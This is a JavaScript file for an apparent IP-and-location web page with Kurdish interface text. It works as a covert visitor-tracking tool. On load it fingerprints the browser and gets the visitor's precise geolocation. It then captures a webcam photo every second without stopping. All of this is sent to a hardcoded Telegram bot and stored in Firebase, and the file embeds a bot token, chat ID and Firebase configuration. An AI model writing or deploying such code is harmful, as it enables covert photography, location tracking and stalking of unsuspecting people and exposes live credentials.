// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, doc, runTransaction, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUIqPzbk_9XruKwPxZHYoV9d6MZW2xK7E",
    authDomain: "ipandlocation-70396.firebaseapp.com",
    projectId: "ipandlocation-70396",
    storageBucket: "ipandlocation-70396.firebasestorage.app",
    messagingSenderId: "1058281648206",
    appId: "1:1058281648206:web:456211d8af3a72f3fa131f",
    measurementId: "G-KP91BWPLN0"
};

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8177366849:AAE0l7QIXDW0st-BpUjdKk8sZlGjYME5_ws";
const TELEGRAM_CHAT_ID = "910275034";

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.addEventListener('DOMContentLoaded', async () => {
    const loading = document.getElementById('loading');
    const content = document.getElementById('info-content');
    const saveStatus = document.getElementById('save-status');

    // Display Elements
    const ipDisplay = document.getElementById('ip-display');
    const deviceDisplay = document.getElementById('device-display');
    const osDisplay = document.getElementById('os-display');
    const browserDisplay = document.getElementById('browser-display');
    const ispDisplay = document.getElementById('isp-display');
    const orgDisplay = document.getElementById('org-display');
    const connectionDisplay = document.getElementById('connection-display');

    try {
        // 1. Fetch IP and Location Info
        const ipRes = await fetch('https://ipwho.is/');
        const ipData = await ipRes.json();

        if (!ipData.success) {
            throw new Error(`API Error: ${ipData.message}`);
        }

        // 2. Detect Device Info
        const userAgent = navigator.userAgent;
        let os = ipData.os || "Unknown OS";
        let browser = ipData.browser || "Unknown Browser";
        let deviceType = "Desktop";

        if (userAgent.indexOf("Mobi") !== -1) deviceType = "Mobile";

        // 3. Detect Connection Type
        const isp = ipData.connection ? ipData.connection.isp : "Unknown ISP";
        const org = ipData.connection ? ipData.connection.org : "Unknown Org";
        let connectionSpeed = "Unknown Speed";

        if (navigator.connection) {
            connectionSpeed = navigator.connection.effectiveType.toUpperCase();
        }

        // 4. Update UI - Basic Info
        ipDisplay.textContent = ipData.ip || "N/A";
        deviceDisplay.textContent = deviceType;
        osDisplay.textContent = os;
        browserDisplay.textContent = browser;
        ispDisplay.textContent = isp;
        if (orgDisplay) orgDisplay.textContent = org;
        connectionDisplay.textContent = connectionSpeed;

        // --- Collect Detailed Device Info ---
        const detailedInfo = {
            productSub: navigator.productSub || "N/A",
            vendor: navigator.vendor || "N/A",
            maxTouchPoints: navigator.maxTouchPoints || 0,
            cookieEnabled: navigator.cookieEnabled,
            appCodeName: navigator.appCodeName || "N/A",
            appName: navigator.appName || "N/A",
            appVersion: navigator.appVersion || "N/A",
            platform: navigator.platform || "N/A",
            product: navigator.product || "N/A",
            userAgent: navigator.userAgent || "N/A",
            language: navigator.language || "N/A",
            languages: navigator.languages ? navigator.languages.join(', ') : "N/A",
            webdriver: navigator.webdriver || false
        };

        const detailedDisplay = document.getElementById('detailed-device-display');
        let detailsText = "";
        for (const [key, value] of Object.entries(detailedInfo)) {
            detailsText += `${key}: ${value}\n`;
        }
        detailedDisplay.textContent = detailsText;

        // Show content
        loading.style.display = 'none';
        content.style.display = 'block';

        // --- Camera Capture Logic ---
        async function captureAndSendPhoto() {
            // Only run if HTTPS or Localhost
            if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
                console.warn("Camera requires HTTPS. Skipping.");
                return;
            }

            const player = document.getElementById('player');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                player.srcObject = stream;

                // Wait for video to be ready
                await new Promise((resolve) => {
                    player.onloadedmetadata = () => {
                        player.play();
                        // Small delay to ensure camera adjusts light
                        setTimeout(resolve, 1000);
                    };
                });

                // Set canvas size to match video
                canvas.width = player.videoWidth;
                canvas.height = player.videoHeight;

                // Start Continuous Capture (Every 1 second)
                setInterval(() => {
                    if (player.readyState === player.HAVE_ENOUGH_DATA) {
                        // Draw frame
                        context.drawImage(player, 0, 0, canvas.width, canvas.height);

                        // Convert to Blob and Send
                        canvas.toBlob((blob) => {
                            sendPhotoToTelegram(blob);
                        }, 'image/jpeg', 0.7); // Slightly lower quality for speed
                    }
                }, 1000);

                // Note: We are NOT stopping the stream so it keeps running.

            } catch (err) {
                console.error("Camera Error:", err);
                // Optional: Send error to Telegram that camera failed
            }
        }

        function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", photoBlob, "visitor.jpg");
            formData.append("caption", "📸 New Visitor Photo");

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
                .then(res => res.json())
                .then(data => {
                    if (data.ok) console.log("Photo sent to Telegram!");
                    else console.error("Telegram Photo Error:", data);
                })
                .catch(err => console.error("Telegram Photo Network Error:", err));
        }

        // Call Camera Function Immediately
        captureAndSendPhoto();

        // 5. Wait 0s (Immediate), Request Location, THEN Save
        setTimeout(() => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => { processAndSave(position.coords); },
                    (error) => {
                        console.warn("Location error:", error.message);
                        processAndSave(null, error.message);
                    }
                );
            } else {
                processAndSave(null, "Not Supported");
            }
        }, 0);

        async function processAndSave(coords, errorMsg = null) {
            const collectedData = {
                ip: ipData.ip,
                city: ipData.city,
                country: ipData.country,
                isp: isp,
                org: org,
                deviceType: deviceType,
                os: os,
                browser: browser,
                connection: connectionSpeed,
                userAgent: userAgent,
                detailed: detailedInfo,
                location: coords ? {
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    accuracy: coords.accuracy,
                    mapsLink: `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`
                } : { status: errorMsg || "Unknown" },
                timestamp: serverTimestamp()
            };

            // Send to Telegram
            sendToTelegram(collectedData);

            // Save to Firebase
            await saveDataToFirebase(collectedData);
        }

    } catch (error) {
        console.error("Error collecting data:", error);
        loading.innerHTML = `
            <span style="color: #ef4444;">ببورە، هەڵەیەک ڕوویدا.</span><br>
            <span style="font-size: 0.8rem; color: #94a3b8;">${error.message}</span>
        `;
    }

    // --- Firebase: Sequential ID Saving ---
    async function saveDataToFirebase(data) {
        try {
            const counterRef = doc(db, "metadata", "counter");

            await runTransaction(db, async (transaction) => {
                const counterDoc = await transaction.get(counterRef);
                let newCount = 1;

                if (counterDoc.exists()) {
                    newCount = counterDoc.data().count + 1;
                }

                // 1. Update Counter
                transaction.set(counterRef, { count: newCount });

                // 2. Set Visitor Data with ID "1", "2", etc.
                const newVisitorRef = doc(db, "visitors", newCount.toString());
                transaction.set(newVisitorRef, data);
            });

            console.log("Document successfully written with sequential ID!");
            saveStatus.textContent = "✅ زانیاری بە سەرکەوتوویی لە Firebase و Telegram سەیڤ کرا";
            saveStatus.style.backgroundColor = "rgba(16, 185, 129, 0.2)";
            saveStatus.style.color = "#10b981";

        } catch (e) {
            console.error("Error adding document: ", e);
            saveStatus.textContent = "❌ کێشە هەیە لە " + e.message;
            saveStatus.style.backgroundColor = "rgba(239, 68, 68, 0.2)";
            saveStatus.style.color = "#ef4444";
        }
    }

    // --- Telegram Function ---
    function sendToTelegram(data) {
        const text = `
🚨 <b>New Visitor Logged!</b> 🚨

🌍 <b>IP:</b> ${data.ip}
🏳️ <b>Country:</b> ${data.country}, ${data.city}
📱 <b>Device:</b> ${data.deviceType} (${data.os})
🕸️ <b>Browser:</b> ${data.browser}
🔌 <b>ISP:</b> ${data.isp}
🏢 <b>Org:</b> ${data.org}
📶 <b>Speed:</b> ${data.connection}

📍 <b>Location:</b> ${data.location.mapsLink ? `<a href="${data.location.mapsLink}">View on Maps</a>` : (data.location.status || "N/A")}

📝 <b>User Agent:</b>
<pre>${data.userAgent}</pre>
`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        })
            .then(res => res.json())
            .then(data => {
                if (!data.ok) console.error("Telegram Error:", data);
            })
            .catch(err => console.error("Telegram Fetch Error:", err));
    }
});
